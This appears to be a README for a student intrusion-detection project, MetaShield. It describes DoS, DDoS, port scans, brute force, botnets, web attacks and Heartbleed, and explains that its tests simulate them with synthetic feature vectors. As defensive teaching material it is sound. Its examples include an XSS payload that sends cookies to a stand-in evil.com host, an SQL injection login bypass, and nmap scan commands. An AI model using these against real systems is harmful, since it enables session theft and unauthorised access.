# MetaShield — Attack Simulation Guide
### What Each Attack Is & How We Simulate It

---

## Quick Reference Table

| # | Test Script | Attack Name (on Dashboard) | Family | Subtype | Severity |
|---|-------------|---------------------------|--------|---------|----------|
| 1 | `test_dos.py` | DoS-Slowloris | DoS | Slowloris | High |
| 2 | `test_dos.py` | DoS-Hulk | DoS | Hulk | Critical |
| 3 | `test_ddos.py` | DDoS-SYN-Flood | DDoS | SYN Flood | Critical |
| 4 | `test_ddos.py` | DDoS-UDP-Flood | DDoS | UDP Flood | Critical |
| 5 | `test_portscan.py` | PortScan-TCP-SYN | PortScan | TCP SYN | Medium |
| 6 | `test_portscan.py` | PortScan-Stealth | PortScan | Stealth | Medium |
| 7 | `test_bruteforce.py` | BruteForce-SSH | BruteForce | SSH | High |
| 8 | `test_bruteforce.py` | BruteForce-FTP | BruteForce | FTP | High |
| 9 | `test_bot.py` | Botnet-Ares | Botnet | Ares C2 | Critical |
| 10 | `test_bot.py` | Botnet-Zeus | Botnet | Zeus C2 | Critical |
| 11 | `test_webattack.py` | WebAttack-SQLi | WebAttack | SQL Injection | Critical |
| 12 | `test_webattack.py` | WebAttack-XSS | WebAttack | XSS | High |
| 13 | `test_infiltration.py` | Infiltration-Exploit | Infiltration | Privilege Escalation | Critical |
| 14 | `test_infiltration.py` | Infiltration-Rootkit | Infiltration | Rootkit | Critical |
| 15 | `test_heartbleed.py` | Heartbleed-CVE-2014-0160 | Heartbleed | OpenSSL Memory Leak | Critical |
| 16 | `test_detailed_threats.py` | *(All 8 types at once)* | Mixed | Mixed | Mixed |

---

## 1. DoS — Denial of Service

**What is it?**  
A Denial of Service attack aims to make a machine or network resource **unavailable to its intended users**. The attacker overwhelms the target with a flood of requests so that legitimate users cannot access the service.

### Subtype: DoS-Slowloris
- **How it works in real life:** The attacker opens many connections to the target web server and sends partial HTTP headers very slowly. The server keeps all those connections open waiting for the headers to complete, eventually exhausting its connection pool. No legitimate user can connect anymore.
- **Real-world example:** A single laptop can take down an Apache web server by holding open hundreds of half-finished HTTP connections.
- **How we simulate it:** We generate 78-dimensional feature vectors with a **bias of 3.0** and **low variance (0.2)**, mimicking the tight, repetitive pattern of slow drip-feed connections.

### Subtype: DoS-Hulk
- **How it works in real life:** HTTP Unbearable Load King (HULK) generates **massive volumes of unique HTTP GET/POST requests** with randomized URLs and parameters. This bypasses caching mechanisms and forces the server to process each request individually.
- **Real-world example:** Thousands of requests like `GET /page?id=a8f3b2&token=x9k2m1` hit the server per second — every URL is different so nothing can be cached.
- **How we simulate it:** Feature vectors with a **higher bias of 4.5** and **moderate variance (0.3)**, representing the high-volume but slightly varied traffic pattern.

**Test file:** `test_dos.py`

---

## 2. DDoS — Distributed Denial of Service

**What is it?**  
Like DoS, but the attack traffic comes from **many different machines at once** (a botnet of compromised computers). This makes it much harder to block because there's no single source IP to filter.

### Subtype: DDoS-SYN-Flood
- **How it works in real life:** The attacker sends a massive volume of **TCP SYN packets** (connection initiation requests) from thousands of spoofed IP addresses. The server allocates resources for each half-open connection and eventually runs out of memory in its TCP connection table.
- **Real-world example:** A botnet of 10,000 compromised IoT devices all send SYN packets to a bank's web server simultaneously — the server's connection queue overflows.
- **How we simulate it:** Feature vectors with **very high bias (5.0)** and **moderate variance (0.4)**, representing the extreme volume from distributed sources.

### Subtype: DDoS-UDP-Flood
- **How it works in real life:** The attacker sends a huge number of **UDP packets** to random ports on the target. The server checks for applications listening on those ports, finds none, and sends back ICMP "Destination Unreachable" packets — consuming bandwidth in both directions.
- **Real-world example:** 100 Gbps of UDP traffic hits a gaming server, saturating its entire network link.
- **How we simulate it:** Feature vectors with **bias of 5.5** and **variance 0.35**, distinct from SYN-Flood to represent the different protocol pattern.

**Test file:** `test_ddos.py`

---

## 3. PortScan — Network Reconnaissance

**What is it?**  
Port scanning is a **reconnaissance technique** where an attacker probes a server's ports to discover which services are running (e.g., SSH on port 22, HTTP on port 80). This is typically the **first step before launching an actual attack**.

### Subtype: PortScan-TCP-SYN
- **How it works in real life:** The attacker sends SYN packets to thousands of ports. If a port responds with SYN-ACK, it's open. The attacker immediately sends RST (reset) to avoid completing the connection — making it harder to log.
- **Real-world example:** An attacker runs `nmap -sS 192.168.1.100` to find open ports on a corporate server before attempting to exploit vulnerable services.
- **How we simulate it:** Feature vectors with **negative bias (-2.8)** and **low variance (0.3)**, representing the quick, systematic probe pattern across many ports.

### Subtype: PortScan-Stealth
- **How it works in real life:** Uses techniques like **FIN scans, NULL scans, or XMAS scans** that send unusual TCP flag combinations. Many firewalls and IDS systems don't log these because they're not standard connection attempts.
- **Real-world example:** `nmap -sF 192.168.1.100` sends TCP FIN packets — closed ports respond with RST, open ports stay silent.
- **How we simulate it:** Feature vectors with **bias of -3.2** and **very low variance (0.25)**, representing the subtle, hard-to-detect probe pattern.

**Test file:** `test_portscan.py`

---

## 4. BruteForce — Credential Stuffing

**What is it?**  
A brute force attack tries to gain unauthorized access by **systematically trying every possible password** (or a dictionary of common passwords) against a login service.

### Subtype: BruteForce-SSH (SSH-Patator)
- **How it works in real life:** The attacker repeatedly attempts to log into an SSH server (port 22) using different username/password combinations from a wordlist. Tools like Hydra or Patator automate thousands of login attempts per minute.
- **Real-world example:** An attacker tries `root:password123`, `root:admin`, `root:123456`, etc. against a cloud server's SSH port until one works.
- **How we simulate it:** Feature vectors with **bias of 1.8** and **higher variance (0.5)**, representing the repetitive but slightly varied login attempt patterns.

### Subtype: BruteForce-FTP (FTP-Patator)
- **How it works in real life:** Same concept as SSH brute force, but targeting **FTP servers** (port 21). FTP often has weaker security policies and may allow anonymous access, making it a common target.
- **Real-world example:** An attacker targets a company's FTP file server to gain access to internal documents.
- **How we simulate it:** Feature vectors with **bias of 2.2** and **variance 0.4**, slightly different from SSH to represent the distinct FTP protocol fingerprint.

**Test file:** `test_bruteforce.py`

---

## 5. Botnet — Command & Control (C2)

**What is it?**  
A botnet is a network of **compromised computers ("bots" or "zombies")** controlled remotely by an attacker through a Command & Control (C2) server. The bots periodically "phone home" to receive instructions — launch DDoS, send spam, mine crypto, etc.

### Subtype: Botnet-Ares
- **How it works in real life:** Ares is an open-source Python RAT (Remote Access Trojan). Once installed on a victim's machine, it establishes a **persistent connection to a C2 server**, sending system telemetry (CPU, OS, IP) and receiving commands (screenshot, keylog, download file).
- **Real-world example:** An employee opens a malicious email attachment → Ares installs silently → the attacker can remotely control the machine and exfiltrate data.
- **How we simulate it:** Feature vectors with **negative bias (-0.8)** and **high variance (0.6)**, representing the periodic beacon traffic with varying payload sizes.

### Subtype: Botnet-Zeus
- **How it works in real life:** Zeus (Zbot) is a notorious banking trojan that steals **financial credentials** through man-in-the-browser attacks. It intercepts web forms (bank login pages) and sends the captured data to a C2 server.
- **Real-world example:** A victim logs into their online banking → Zeus captures the username, password, and 2FA code → the attacker drains the bank account.
- **How we simulate it:** Feature vectors with **bias of -1.2** and **variance 0.5**, representing the stealthy, encrypted C2 communication pattern.

**Test file:** `test_bot.py`

---

## 6. WebAttack — Application-Layer Exploits

**What is it?**  
Web attacks target vulnerabilities in **web applications** (websites, APIs) rather than the network infrastructure. They exploit flaws in how the application processes user input.

### Subtype: WebAttack-SQLi (SQL Injection)
- **How it works in real life:** The attacker inserts **malicious SQL code** into input fields (login forms, search boxes, URLs). If the application doesn't sanitize input, the SQL is executed on the database — allowing the attacker to read, modify, or delete data.
- **Real-world example:** In a login form, entering `admin' OR '1'='1` as the username bypasses authentication because the SQL query becomes `SELECT * FROM users WHERE username='admin' OR '1'='1'` — which is always true.
- **How we simulate it:** Feature vectors with **strong negative bias (-2.8)** and **low variance (0.3)**, representing the structured, pattern-heavy injection payloads.

### Subtype: WebAttack-XSS (Cross-Site Scripting)
- **How it works in real life:** The attacker injects **malicious JavaScript** into a web page that other users will view. When a victim loads the page, the script runs in their browser — stealing cookies, session tokens, or redirecting them to phishing sites.
- **Real-world example:** An attacker posts a comment containing `<script>document.location='http://evil.com/steal?c='+document.cookie</script>` on a forum. Every user who views the comment has their session cookie stolen.
- **How we simulate it:** Feature vectors with **bias of -3.5** and **very low variance (0.2)**, representing the highly structured script injection patterns.

**Test file:** `test_webattack.py`

---

## 7. Infiltration — Internal Network Exploitation

**What is it?**  
Infiltration attacks occur when an attacker has already **gained initial access** to a network and is now trying to **move laterally** — escalating privileges, accessing restricted resources, and establishing persistence.

### Subtype: Infiltration-Exploit (Privilege Escalation)
- **How it works in real life:** After gaining access as a regular user, the attacker exploits a **system vulnerability** (e.g., a kernel bug, misconfigured SUID binary) to gain root/admin access. With elevated privileges, they can access any file, install backdoors, and modify system configurations.
- **Real-world example:** An attacker uses a local privilege escalation exploit like Dirty COW (CVE-2016-5195) to go from a web server user to root, then installs a persistent backdoor.
- **How we simulate it:** Feature vectors with **positive bias (2.5)** and **high variance (0.7)**, representing the varied and complex patterns of internal exploitation traffic.

### Subtype: Infiltration-Rootkit
- **How it works in real life:** A rootkit is malware that **hides its presence** deep in the operating system (kernel level). It modifies system calls to make malicious files, processes, and network connections invisible to the administrator.
- **Real-world example:** The attacker installs a kernel rootkit that hides a cryptocurrency miner — `ps`, `top`, and `netstat` show nothing suspicious, but the server's CPU is at 100%.
- **How we simulate it:** Feature vectors with **bias of 3.0** and **variance 0.6**, representing the stealthy, deeply embedded system-level traffic.

**Test file:** `test_infiltration.py`

---

## 8. Heartbleed — OpenSSL Memory Leak (CVE-2014-0160)

**What is it?**  
Heartbleed is one of the most famous vulnerabilities in internet history. It's a bug in **OpenSSL's TLS heartbeat extension** that allows an attacker to **read up to 64KB of server memory** per request — potentially exposing passwords, private keys, and encrypted data.

### Subtype: Heartbleed-CVE-2014-0160
- **How it works in real life:** The TLS heartbeat protocol lets a client say "Are you alive? Here's 4 bytes of data, send me back 4 bytes." The bug allows the client to say "Here's 1 byte of data, send me back 65,535 bytes." The server reads 65,534 bytes beyond the buffer — returning whatever is in adjacent memory.
- **Real-world example:** An attacker sends crafted heartbeat requests to a bank's HTTPS server. Each response leaks a chunk of server memory. After thousands of requests, the attacker has captured other users' passwords, session cookies, and even the server's private SSL key.
- **Why it was catastrophic:** When announced in April 2014, an estimated **17% of all HTTPS web servers** were vulnerable. The attacker leaves no trace in server logs.
- **How we simulate it:** Feature vectors with **bias of 3.8** and **moderate variance (0.5)**, representing the characteristic oversized heartbeat request/response pattern.

**Test file:** `test_heartbleed.py`

---

## How Each Test Script Works (Step by Step)

Every test script follows the same 4-step lifecycle:

```
┌─────────────────────────────────────────────────────┐
│  Step 0: CLEAR  — Forget all existing prototypes    │
│          so they don't interfere with detection      │
├─────────────────────────────────────────────────────┤
│  Step 1: LEARN  — Teach the AI 5 synthetic flow     │
│          samples using /api/learn (Few-Shot)         │
│          → Creates a Bayesian Prototype              │
├─────────────────────────────────────────────────────┤
│  Step 2: DETECT — Send a query flow to /api/detect  │
│          → IDS mode: raises an ALERT                 │
│          → System auto-upgrades to IPS mode          │
├─────────────────────────────────────────────────────┤
│  Step 3: BLOCK  — Confirm the attack is in the      │
│          firewall block list via /api/block           │
│          → All matching traffic is now DROPPED       │
├─────────────────────────────────────────────────────┤
│  Step 4: REPEAT — Send the same attack again         │
│          → The firewall INTERCEPTS and DROPS it      │
│          → Dashboard shows "BLOCKED" status          │
├─────────────────────────────────────────────────────┤
│  Step 5: CLEAN  — Unblock the attack via /api/unblock│
│          → System reverts to passive IDS mode        │
└─────────────────────────────────────────────────────┘
```

---

## How to Run

1. **Start the API server** (in one terminal):
   ```
   python api.py
   ```

2. **Open the dashboard** in your browser:
   ```
   http://localhost:5000
   ```

3. **Run any test script** (in another terminal):
   ```
   python test_dos.py            # DoS attacks only
   python test_ddos.py           # DDoS attacks only
   python test_portscan.py       # PortScan attacks only
   python test_bruteforce.py     # BruteForce attacks only
   python test_bot.py            # Botnet attacks only
   python test_webattack.py      # Web attacks only
   python test_infiltration.py   # Infiltration attacks only
   python test_heartbleed.py     # Heartbleed attacks only
   python test_detailed_threats.py  # ALL 8 attack types at once
   ```

4. **Watch the dashboard** — it auto-syncs every 3 seconds and will show:
   - The **attack name** and its **subtype** tag
   - The **AI confidence** score
   - The **severity** level (medium/high/critical)
   - The **status** (ALERT → BLOCKED)
   - The **Confidence Matrix** chart updating in real time
   - The **Vector Distribution** pie chart showing attack categories

---

## Dataset Reference

These attack types are based on the **CIC-IDS2017** dataset from the Canadian Institute for Cybersecurity, which contains real-world network traffic captures of these exact attack families. Our MetaShield system uses a Prototypical Neural Network trained on this dataset to learn attack signatures from just 5 examples (few-shot learning).

| Dataset Class | Our Test Simulation |
|---|---|
| Benign | Normal traffic (no alert) |
| DoS Slowloris | DoS-Slowloris |
| DoS Hulk | DoS-Hulk |
| DDoS | DDoS-SYN-Flood, DDoS-UDP-Flood |
| PortScan | PortScan-TCP-SYN, PortScan-Stealth |
| FTP-Patator | BruteForce-FTP |
| SSH-Patator | BruteForce-SSH |
| Bot | Botnet-Ares, Botnet-Zeus |
| Web Attack – SQL Injection | WebAttack-SQLi |
| Web Attack – XSS | WebAttack-XSS |
---

## How Confidence Level is Calculated (1.0 or 100%)

In a typical deep learning classifier, confidence is computed using a **Softmax** function that forces all probabilities to sum to 1. 

In MetaShield, because we use a **few-shot learning Prototypical Network** with **Bayesian variance scaling**, the confidence is computed independently for each attack prototype using the **Expected Log-Likelihood** formula.

### The Mathematical Formula

For each registered attack type, the system computes the statistical distance from the incoming flow embedding $x$ to the prototype's cluster center $\mu$ (mean) scaled by its variance $\sigma^2$:

$$\text{distance} = 0.5 \sum_{i=1}^{D} \left( \ln(\sigma^2_i) + \frac{(x_i - \mu_i)^2}{\sigma^2_i} \right)$$

Where:
- $D$ is the embedding dimension.
- $\mu_i$ is the average feature value for dimension $i$ (learned during the 5-example setup).
- $\sigma^2_i$ is the variance (spread) of the features for dimension $i$.

Once the distance is calculated, it is converted into a percentage confidence score using a bounding function:

$$\text{confidence} = \frac{1}{1.0 + \text{distance}} \quad (\text{bounded to } 1.0 \text{ if distance } \le 0)$$

### Why the Dashboard Shows 1.0 (100%) Confidence

1. **Perfect Centroid Alignment:** Our manual test scripts generate query flows using the exact same random distribution generator (same mean/bias parameters) as the learned prototypes. When the incoming query vector lands directly on the center of the learned cluster ($\mu$), the term $(x_i - \mu_i)^2$ approaches **$0$**.
2. **Tight Clusters (Negative Log-Likelihood):** The test examples are generated with low variance (e.g., standard deviation of 0.2 to 0.5). When variance $\sigma^2$ is less than $1$, the natural logarithm $\ln(\sigma^2)$ produces a **negative value**. 
3. **Safety Fallback:** When the distance formula evaluates to a negative number or zero, [detector.py line 183](file:///c:/edi%20sem%204/Updated_EDI4/detector.py#L183) clamps it:
   ```python
   confidence = 1.0 / (1.0 + distance) if distance > 0 else 1.0
   ```
   This results in an exact confidence of `1.0` ($100\%$), indicating that the incoming flow fits perfectly inside the statistical boundaries of the learned signature.
